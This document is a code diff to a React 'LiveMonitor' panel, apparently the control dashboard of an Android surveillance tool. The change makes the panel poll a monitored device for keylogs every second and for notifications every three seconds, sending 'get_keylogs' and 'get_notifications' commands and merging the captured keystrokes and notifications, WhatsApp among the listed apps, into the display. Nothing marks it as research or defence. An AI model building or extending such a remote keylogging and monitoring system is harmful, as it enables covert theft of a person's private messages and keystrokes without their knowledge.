@@ -1,4 +1,4 @@
-import React, { useRef, useMemo } from 'react';
+import React, { useRef, useEffect, useState, useMemo } from 'react';
 
 const APP_COLORS = {
   'com.whatsapp': '#25D366',
@@ -173,14 +173,79 @@ function KeylogFeed({ entries }) {
   );
 }
 
-// LiveMonitor is purely passive — it renders only what the Android app pushes
-// in real time via SSE. No fetching, no polling, no commands are sent.
-// Data arrives through: keylog:push → keylogEntries, notification:push → notifEntries,
-// activity:app_open → activityEntries (all streamed from App.jsx via SSE).
-export default function LiveMonitor({ notifEntries, activityEntries, keylogEntries }) {
-  const notifs   = useMemo(() => dedupeNotifs(notifEntries   || []).slice(0, 100), [notifEntries]);
+export default function LiveMonitor({ notifEntries, activityEntries, keylogEntries, device, sendCommand, results }) {
+  const [fetchedKeylogs, setFetchedKeylogs] = useState([]);
+  const [fetchedNotifs, setFetchedNotifs]   = useState([]);
+  const seenResultIds = useRef(new Set());
+
+  const deviceId = device?.deviceId;
+  const isOnline = device?.isOnline;
+
+  // ── Fetch keylogs immediately, then every 1 second ──────────────────
+  useEffect(() => {
+    if (!isOnline || !sendCommand || !deviceId) return;
+
+    const fetch = () => sendCommand(deviceId, 'get_keylogs', { limit: 200 });
+    fetch();
+    const id = setInterval(fetch, 1000);
+    return () => clearInterval(id);
+  }, [isOnline, deviceId, sendCommand]);
+
+  // ── Fetch notifications every 3 seconds (like keylogs) ──────────────
+  useEffect(() => {
+    if (!isOnline || !sendCommand || !deviceId) return;
+    const fetch = () => sendCommand(deviceId, 'get_notifications', { limit: 100 });
+    fetch();
+    const id = setInterval(fetch, 3000);
+    return () => clearInterval(id);
+  }, [isOnline, deviceId, sendCommand]);
+
+  // ── Parse command results for keylogs and notifications ─────────────
+  useEffect(() => {
+    if (!results) return;
+    results.forEach(r => {
+      if (seenResultIds.current.has(r.id)) return;
+      if (!r.success || !r.response) return;
+      if (r.command === 'get_keylogs') {
+        seenResultIds.current.add(r.id);
+        try {
+          const d = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
+          if (d.logs) setFetchedKeylogs(d.logs);
+        } catch (_) {}
+      }
+      if (r.command === 'get_notifications') {
+        seenResultIds.current.add(r.id);
+        try {
+          const d = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
+          if (d.notifications) {
+            setFetchedNotifs(prev => {
+              const combined = [...d.notifications, ...prev];
+              const seen = new Set();
+              return combined.filter(n => {
+                const key = `${n.packageName}|${n.postTime}|${n.title}|${n.text}`;
+                if (seen.has(key)) return false;
+                seen.add(key);
+                return true;
+              }).slice(0, 100);
+            });
+          }
+        } catch (_) {}
+      }
+    });
+  }, [results]);
+
+  // ── Merge push + fetched, dedupe ────────────────────────────────────
+  const notifs = useMemo(() =>
+    dedupeNotifs([...(notifEntries || []), ...fetchedNotifs]).slice(0, 100),
+    [notifEntries, fetchedNotifs]
+  );
+
   const activity = (activityEntries || []).slice(0, 100);
-  const keylogs  = useMemo(() => dedupeKeylogs(keylogEntries || []).slice(0, 200), [keylogEntries]);
+
+  const keylogs = useMemo(() =>
+    dedupeKeylogs([...(keylogEntries || []), ...fetchedKeylogs]).slice(0, 200),
+    [keylogEntries, fetchedKeylogs]
+  );
 
   return (
     <div className="live-monitor">
